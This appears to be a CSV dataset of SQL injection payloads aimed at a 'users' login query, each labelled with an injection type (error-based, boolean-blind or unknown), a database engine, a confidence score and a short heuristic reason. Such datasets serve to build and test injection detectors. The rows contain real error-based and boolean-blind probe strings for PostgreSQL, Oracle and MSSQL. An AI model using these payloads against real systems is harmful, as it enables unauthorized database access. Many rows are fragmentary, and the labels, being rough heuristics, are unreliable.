id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
39436,"select * from users WHERE username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1\' ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39437,"select * from users WHERE username = ""-6353%\' ) ) or username = ""1"" or username = ""1%\' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39438,1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39439,"1 ) ) as xoch where 8765 = 8765 or username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
39440,"-9742 ) where 8409 = 8409 or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
39441,1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39442,"1%\' ) ) ) or username = ""-1254"" or username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'wkkp\' like \'wkkp",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39443,"select * from users WHERE username = ""1\' ) ) or username = ""-1641\' ) ) and ( ( \'vgcb\' like \'vgcb"" or username = ""-9553 ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39444,"select * from users WHERE username = ""-5863"" and username = ""1 ) ) and ( ( 5139 = 5139"" and username = ""-1190\'",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39445,"select * from users WHERE username = ""-3978 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""1"" or username = ""1\' where 8537 = 8537",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39446,-6353%\' ) ) and ( ( \'%\' = \',unknown,generic,0.50,Insufficient data to classify payload type,1
39447,"select * from users WHERE username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""-8860 ) and username = ""-2756\' where 6156 = 6156",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39448,"select * from users WHERE username = ""-4262%\' ) ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'"" and username = ""-2348 ) as sige where 1639 = 1639",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39449,"-1254"" and username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39450,"SELECT * FROM users WHERE usErnamE = ""1\'+ ( sElEct \'uEak\' whErE 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( sElEct ( casE whEn ( 2853 = 2853 ) thEn 1 ElsE 0 End ) ) ::tExt|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numEric ) ) +\'"" AND username = ""-9564",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39451,"1"" and username = ""1"" and ( ( ( \'mfmk\' = \'mfmk",unknown,generic,0.50,Insufficient data to classify payload type,1
39452,"-3899\' ) where 8152 = 8152 or username = ""-5863"" or username = ""1%\' ) ) and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39453,"-6523"" and \'kfff\' = \'kfff"" and username = ""-8112\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39454,"select * from users WHERE username = ""-2495 ) ) as hudw where 4197 = 4197 or username = ""1 and username = ""-7430\' ) as xfah where 1596 = 1596",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39455,"select * from users WHERE username = ""-6353%\' ) ) or username = ""1"" or username = ""1\' where 8537 = 8537",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39456,"select * from users WHERE username = ""-3859 ) or username = ""-5062 ) where 7457 = 7457 and username = ""-7874 ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39457,"select * from users WHERE username = ""1\' and \'fbzo\' like \'fbzo"" and username = ""-6720\' ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39458,"-6203\' ) ) ) or username = ""-5863"" and ""gkvy"" = ""gkvy"" and username = ""1%",unknown,generic,0.50,Insufficient data to classify payload type,1
39459,1\'|| ( select \'vvpn\' from dual where 7011 = 7011 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\',error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39460,"select * from users WHERE username = ""-1254"" or username = ""1\' and username = ""-3899\' ) where 8152 = 8152",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39461,"-6190\' ) where 2621 = 2621 and username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
39462,"1%\' ) ) ) or username = ""-1254"" and username = ""1\' ) ) ) and ( ( ( \'ykjs\' like \'ykjs",unknown,generic,0.50,Insufficient data to classify payload type,1
39463,"-9564 and username = ""-6190\' ) where 2621 = 2621 and username = ""-6079 ) ) ) and ( ( ( 8708 = 8708",unknown,generic,0.50,Insufficient data to classify payload type,1
39464,"select * from users WHERE username = ""1\' ) ) ) and username = ""-9295 ) ) ) and ( ( ( 8752 = 8752"" or username = ""-4582 ) ) as gvfo where 8885 = 8885",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39465,"select * from users WHERE username = ""-5863"" or username = ""1%\' ) ) or username = ""1%\' ) ) ) and username = ""-6190\' ) where 2621 = 2621",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39466,"1"" and ( ( ( \'qhdg\' = \'qhdg"" or username = ""-4262%\' ) ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39467,-7199\' or \'qibr\' = \'qibr,unknown,generic,0.50,Insufficient data to classify payload type,1
39468,"1\' ) and username = ""1\' ) ) and username = ""-9564 or username = ""1%",unknown,generic,0.50,Insufficient data to classify payload type,1
39469,"-9770\' ) ) as ovhh where 7903 = 7903 or username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39470,"select * from users WHERE username = ""-2806\' ) ) ) and ( ( ( \'rxzr\' = \'rxzr"" and username = ""-1254"" and username = ""-1344 ) as gqgi where 2545 = 2545",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39471,"1\'|| ( select \'rjis\' from dual where 7696 = 7696 and username = ""1",boolean_blind,oracle,0.80,Boolean Blind detected: SQL structure with complex syn (oracle),1
39472,-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39473,"-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
39474,"select * from users WHERE username = ""1"" or username = ""1 ) where 3381 = 3381 or username = ""1\'|| ( select \'byxb\' where 8351 = 8351",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39475,"select * from users WHERE username = ""-1985 ) ) ) and \'nmdq\' like \'nmdq"" or username = ""1\' )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39476,"select * from users WHERE username = ""-6203\' ) ) ) and ( ( ( \'luee\' = \'luee"" and username = ""1",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39477,"select * from users WHERE username = ""1\'+ ( select vohg where 6383 = 6383 and username = ""-1254"" or username = ""-7209\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39478,"SELECT * FROM users WHERE usErnamE = ""1\'+ ( sElEct \'uEak\' whErE 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( sElEct ( casE whEn ( 2853 = 2853 ) thEn 1 ElsE 0 End ) ) ::tExt|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numEric ) ) +\'"" OR username = ""1 ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39479,"-5313\' ) ) ) or username = ""1"" and username = ""1\' and \'fbzo\' like \'fbzo",unknown,generic,0.50,Insufficient data to classify payload type,1
39480,"1\'+ ( select vohg where 6383 = 6383 AND username = ""-6203\' ) ) ) and ( ( ( \'luee\' = \'luee",unknown,generic,0.50,Insufficient data to classify payload type,1
39481,"1\' ) ) or username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39482,"select * from users WHERE username = ""-1254"" and username = ""1\' ) ) ) and username = ""-1254"" and username = ""1",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39483,1%\' ) ) ) and ( ( ( \'%\' = \',unknown,generic,0.50,Insufficient data to classify payload type,1
39484,"1\'|| ( select \'rjis\' from dual where 7696 = 7696 and username = ""1\' and ( ( ( \'%\' = \'",boolean_blind,oracle,0.80,Boolean Blind detected: SQL structure with complex syn (oracle),1
39485,"select * from users WHERE username = ""-5863"" or username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""1 where 5161 = 5161",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39486,"1 ) as nbno where 9816 = 9816 and username = ""1\' ) ) ) and username = ""1"" or username = ""-4322\' ) ) as magw where 1627 = 1627 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39487,"select * from users WHERE username = ""1%\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'%\' = \'"" or username = ""-6036 ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39488,"1 and username = ""-6190\' ) where 2621 = 2621 or username = ""-5863"" and ""gkvy"" = ""gkvy",unknown,generic,0.50,Insufficient data to classify payload type,1
39489,"select * from users WHERE username = ""1\' ) or username = ""-1254"" and username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-2756\' where 6156 = 6156",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39490,"select * from users WHERE username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-4952\' ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39491,"-7209\' ) ) ) and 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39492,"select * from users WHERE username = ""1 or username = ""1 and username = ""1"" or username = ""-7242\'",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39493,"select * from users WHERE username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-6036 ) ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39494,"-6079 ) ) ) and username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
39495,"select * from users WHERE username = ""-3499\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'nzap\' like \'nzap"" or username = ""-9770\' ) ) as ovhh where 7903 = 7903",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39496,"select * from users WHERE username = ""-3185\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1%\' ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39497,"1 ) ) as dgso where 4654 = 4654 and username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39498,"select * from users WHERE username = ""-3499\' ) ) ) and ( ( ( \'nzap\' like \'nzap"" or username = ""-1889%\' ) ) ) and username = ""-6190\' ) where 2621 = 2621",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39499,"1\' ) ) or username = ""-1641\' ) ) and username = ""-5352%\' ) ) ) and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39500,-7209\' ) ) ) or ( ( ( \'stqx\' = \'stqx,unknown,generic,0.50,Insufficient data to classify payload type,1
39501,"-1190\' and username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" or username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
39502,"select * from users WHERE username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-2806\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39503,"1\' and username = ""1 ) ) or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
39504,"select * from users WHERE username = ""1 ) ) ) and ( ( ( 6395 = 6395"" and username = ""-4582 ) ) as gvfo where 8885 = 8885",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39505,"select * from users WHERE username = ""1"" and username = ""-5062 ) where 7457 = 7457 or username = ""1\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39506,"1\' ) or username = ""-6190\' ) where 2621 = 2621 and username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
39507,"select * from users WHERE username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696 and username = ""-1254"" or username = ""-7209\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39508,-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'blak\' = \'blak,error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39509,"-9987 ) ) ) and username = ""-1641\' ) ) and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39510,"select * from users WHERE username = ""-1254"" and username = ""-3899\' ) where 8152 = 8152 or username = ""-1254"" or username = ""-7209\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39511,"1 or username = ""-4610\' ) ) or username = ""-6079 ) ) ) and ( ( ( 8708 = 8708",unknown,generic,0.50,Insufficient data to classify payload type,1
39512,"1%\' ) ) ) or username = ""-8069\' ) ) and ( ( \'qbvz\' = \'qbvz",unknown,generic,0.50,Insufficient data to classify payload type,1
39513,1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39514,1\' ) ) ) and ( ( ( \'njge\' like \'njge,unknown,generic,0.50,Insufficient data to classify payload type,1
39515,"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""-5062 ) where 7457 = 7457 and username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39516,"select * from users WHERE username = ""1 ) ) and username = ""-1254"" and username = ""-2756\' where 6156 = 6156",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39517,"select * from users WHERE username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-2756\' where 6156 = 6156 or username = ""1\' and \'fbzo\' like \'fbzo"" or username = ""1\' ) where 1502 = 1502",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
39518,"1 and username = ""-6190\' ) where 2621 = 2621 or username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'blak\' = \'blak",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39519,"select * from users WHERE username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""1 ) ) as xoch where 8765 = 8765",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39520,"-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'qbvz\' = \'qbvz",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39521,"1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) and username = ""-6179 ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 7732 = 7732",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39522,"select * from users WHERE username = ""-5863"" and ( ( 5139 = 5139"" or username = ""-1254"" and username = ""1%\' ) ) ) or username = ""1\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39523,"1\' in boolean mode ) or username = ""-6353%\' ) ) and username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk",unknown,generic,0.50,Insufficient data to classify payload type,1
39524,"-9742 ) where 8409 = 8409 or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
39525,-7209\' ) ) ) and 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or ( ( ( \'stqx\' = \'stqx,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39526,"-4952\' ) ) ) OR username = ""-6079 ) ) ) and ( ( ( 8708 = 8708",unknown,generic,0.50,Insufficient data to classify payload type,1
